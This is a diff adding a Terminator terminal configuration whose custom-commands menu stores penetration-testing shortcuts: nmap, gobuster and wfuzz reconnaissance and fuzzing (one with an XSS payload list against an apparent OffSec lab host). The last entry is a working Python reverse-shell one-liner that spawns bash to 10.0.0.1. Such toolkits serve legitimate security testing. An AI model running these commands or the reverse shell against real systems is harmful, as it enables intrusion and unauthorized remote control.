@@ -1,0 +1,98 @@
+[global_config]
+  window_state = maximise
+  inactive_color_offset = 0.5185185185185185
+  enabled_plugins = LaunchpadBugURLHandler, LaunchpadCodeURLHandler, APTURLHandler, CustomCommandsMenu
+[keybindings]
+  zoom_in = <Primary>equal
+  zoom_out = <Primary>minus
+  new_tab = <Primary>t
+  split_horiz = <Primary>s
+  split_vert = <Primary>d
+  toggle_scrollbar = <Primary>question
+  page_up = Page_Up
+  page_down = Page_Down
+  line_up = <Primary>Up
+  line_down = <Primary>Down
+  scaled_zoom = <Primary>a
+  switch_to_tab_1 = <Alt>1
+  switch_to_tab_2 = <Alt>2
+  switch_to_tab_3 = <Alt>3
+  switch_to_tab_4 = <Alt>4
+  switch_to_tab_5 = <Alt>5
+  switch_to_tab_6 = <Alt>6
+  switch_to_tab_7 = <Alt>7
+  switch_to_tab_8 = <Alt>8
+  switch_to_tab_9 = <Alt>9
+  edit_tab_title = <Primary><Shift>s
+[profiles]
+  [[default]]
+    icon_bell = False
+    background_darkness = 0.95
+    font = Fira Code Medium 16
+    foreground_color = "#00ff00"
+    scrollbar_position = hidden
+    scrollback_infinite = True
+    use_theme_colors = True
+    title_transmit_bg_color = "#c01c28"
+    title_use_system_font = False
+[layouts]
+  [[default]]
+    [[[window0]]]
+      type = Window
+      parent = ""
+    [[[child1]]]
+      type = Terminal
+      parent = window0
+[plugins]
+  [[CustomCommandsMenu]]
+    [[[Nmap scan - Port 80 with verion and service]]]
+      enabled = True
+      name = Nmap scan - Port 80 with verion and service
+      name_parse = True
+      command = sudo nmap -p80 -sV $IP
+      position = 0
+    [[[Gobuster - directory bruteforce (common.txt)]]]
+      enabled = True
+      name = Gobuster - directory bruteforce (common.txt)
+      name_parse = True
+      command = gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301
+      position = 1
+    [[[Gobuster subdomain]]]
+      enabled = True
+      name = Gobuster subdomain
+      name_parse = True
+      command = gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
+      position = 2
+    [[[wfuzz - File Discovery]]]
+      enabled = True
+      name = wfuzz - File Discovery
+      name_parse = True
+      command = 'wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "$FUZZ"'
+      position = 3
+    [[[wfuzz - Directory Discvoery]]]
+      enabled = True
+      name = wfuzz - Directory Discvoery
+      name_parse = True
+      command = 'wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403,301 "$FUZZ_DIR"'
+      position = 4
+    [[[wfuzz - Parameter Discovery]]]
+      enabled = True
+      name = wfuzz - Parameter Discovery
+      name_parse = True
+      command = 'wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$FUZZ_DATA"'
+      position = 5
+    [[[wfuzz - Parameter Discovery 2 (XSS payload)]]]
+      enabled = True
+      name = wfuzz - Parameter Discovery 2 (XSS payload)
+      name_parse = True
+      command = "wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt --hc 404,301 http://offsecwp:80/index.php?xss=FUZZ"
+      position = 6
+    [[[Python reverse shell payload]]]
+      enabled = True
+      name = Python reverse shell payload
+      name_parse = True
+      command = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+'''
+      position = 7
+                            
+          
